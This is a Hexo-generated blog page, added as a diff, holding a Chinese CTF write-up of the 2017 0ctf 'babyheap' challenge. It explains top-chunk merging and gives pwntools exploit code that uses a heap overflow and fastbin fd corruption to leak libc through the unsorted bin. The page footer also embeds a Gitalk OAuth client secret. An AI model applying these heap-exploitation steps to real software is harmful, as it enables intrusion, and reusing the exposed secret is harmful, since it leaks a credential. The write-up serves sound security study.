@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    通过2017 0ctf babyheap 学习unsortbin泄露libc地址 |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-通过2017 0ctf babyheap 学习unsortbin泄露libc地址" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      通过2017 0ctf babyheap 学习unsortbin泄露libc地址
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/02/11/%E9%80%9A%E8%BF%872017%200ctf%20babyheap%20%E5%AD%A6%E4%B9%A0unsortbin%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/" class="article-date">
+  <time datetime="2020-02-11T13:45:38.424Z" itemprop="datePublished">2020-02-11</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="通过2017-0ctf-babyheap-学习unsortbin泄露libc地址"><a href="#通过2017-0ctf-babyheap-学习unsortbin泄露libc地址" class="headerlink" title="通过2017 0ctf babyheap 学习unsortbin泄露libc地址"></a>通过2017 0ctf babyheap 学习unsortbin泄露libc地址</h1><a id="more"></a>
+
+<h2 id="注意一下top-chunk"><a href="#注意一下top-chunk" class="headerlink" title="注意一下top chunk"></a>注意一下top chunk</h2><p>一、top chunk</p>
+<pre><code>当我们分配一块堆内存时，top chunk是出于地址的最高处的，其前面就是我们所申请的chunk</code></pre><p>二、top chunk的合并操作</p>
+<pre><code>如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk
+如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk</code></pre><p>线上一下leak部分代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leek libc</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=0</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=1</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=3</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#index=4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#这两个free将1，2放入fastbin 链表中，使得可以修改链表中index=1的地址（通过修改fd）</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload1)<span class="comment">#这里就是通过修改fd指针来修改fastbin链表</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload2)<span class="comment">#修改一下大小使得可以通过机制</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#这里第一个申请的是之前的index=2，第二个申请的堆的地址是我们伪造的地址，与index=4的地址相同</span></span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload3)<span class="comment">#这里的话是将大小修改过来，为之后的放入unsort bin做准备</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#这里是为了防止top chunk合并free的small bin（index=4）看本文开头</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('\x00' * 0x)</span></span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"main_arena: "</span>+hex(main_arena))<span class="comment">#这里就泄露出来了</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x7fffff3f4b78</span> - <span class="number">88</span> - <span class="number">0x7fffff030000</span></span><br><span class="line"><span class="comment">#这里是根据本机计算出的offset，offset是恒定不变的</span></span><br><span class="line">log.info(<span class="string">"offset: "</span>+hex(offset))</span><br><span class="line">libc_base = main_arena - <span class="number">88</span> -offset</span><br><span class="line">log.success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p>正向思考：</p>
+<p>1.我们发现存在dump函数可以输出一个堆中的数据，那么我们就思考怎样将一个堆内容设置为可以泄露libc的地址</p>
+<p>2.通过观察我们可以发现这里存在一个堆溢出，可以尝试使用unsort bin泄露libc</p>
+<p>我们需要一个可以在free后放入unsort bin的堆，并且需要将另一个堆的地址覆盖为，这个放入unsort bin的地址，我们发现可以通过堆溢出进行最低字节的覆盖，由于在申请堆空间的时候，会有一个检查堆大小是否与当前位置大小对应的机制，所以我们在 free后再次申请的时候，需要将那个空间大的堆的大小修改一下，申请完可以再修改回来</p>
+<p>3.之后我们free掉small bin，然后读取就可以了。</p>
+<p>具体解释在exp中</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/11/%E9%80%9A%E8%BF%872017%200ctf%20babyheap%20%E5%AD%A6%E4%B9%A0unsortbin%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/" data-id="ck6hxvr8d000s3gluc47qc25q"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/02/09/off%20by%20one/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">off by one</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '665e1db541e975225bc6',
+      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
+      repo: 'talk',
+      owner: 'summerN',
+      admin: ['summerN'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
